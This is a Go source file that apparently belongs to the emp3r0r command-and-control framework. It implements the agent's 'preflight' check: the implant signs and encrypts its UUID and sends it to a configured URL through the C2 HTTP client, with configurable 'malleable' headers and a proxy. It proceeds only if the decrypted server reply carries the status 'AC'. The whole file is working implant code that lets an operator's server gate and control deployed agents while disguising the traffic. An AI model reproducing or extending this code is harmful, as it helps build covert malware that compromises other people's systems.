package preflight

import (
	"bytes"
	"encoding/json"
	"io"
	"net/http"
	"time"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/agentutils"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

// Check performs the preflight check
func Check(config *def.Config) bool {
	if !config.PreflightEnabled {
		return true
	}

	url := config.PreflightURL
	if url == "" {
		logging.Debugf("Preflight enabled but no URL? Assume success.")
		return true
	}

	logging.Printf("Performing Preflight Check: %s", url)

	// 1. Prepare Payload
	reqData := PreflightRequest{
		AgentUUID: config.AgentUUID,
		Timestamp: time.Now().Unix(),
	}
	// Sign
	sig, err := agentutils.SignWithAgentKey([]byte(config.AgentUUID))
	if err == nil {
		reqData.AgentUUIDSig = sig
	}

	rawBytes, err := json.Marshal(reqData)
	if err != nil {
		logging.Errorf("Preflight: json marshal: %v", err)
		return false
	}

	encrypted, err := transport.Encrypt(rawBytes)
	if err != nil {
		logging.Errorf("Preflight: encrypt: %v", err)
		return false
	}

	// 2. Prepare Request (POST)
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(encrypted))
	if err != nil {
		logging.Errorf("Preflight: NewRequest: %v", err)
		return false
	}

	// Set Headers (Malleable)
	for k, v := range config.PreflightHeaders {
		req.Header.Set(k, v)
	}
	req.Header.Set("Content-Type", "application/octet-stream") // Or malleable?

	client := transport.CreateEmp3r0rHTTPClient(def.CCAddress, config.C2TransportProxy)
	if client == nil {
		logging.Errorf("Preflight: failed to create HTTP client for %s", def.CCAddress)
		return false
	}
	client.Timeout = 30 * time.Second

	// 3. Send
	resp, err := client.Do(req)
	if err != nil {
		logging.Errorf("Preflight: Do: %v", err)
		return false
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		logging.Errorf("Preflight: status %d", resp.StatusCode)
		return false
	}

	// 4. Decrypt Response
	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		logging.Errorf("Preflight: read body: %v", err)
		return false
	}

	decryptedResp, err := transport.Decrypt(respBody)
	if err != nil {
		logging.Errorf("Preflight: decrypt response: %v", err)
		return false
	}

	var pfResp PreflightResponse
	if err := json.Unmarshal(decryptedResp, &pfResp); err != nil {
		logging.Errorf("Preflight: unmarshal response: %v", err)
		return false
	}

	if pfResp.Status != "AC" {
		logging.Errorf("Preflight: denied (status=%s)", pfResp.Status)
		return false
	}

	logging.Printf("Preflight Success! %s", pfResp.Instruction)
	return true
}
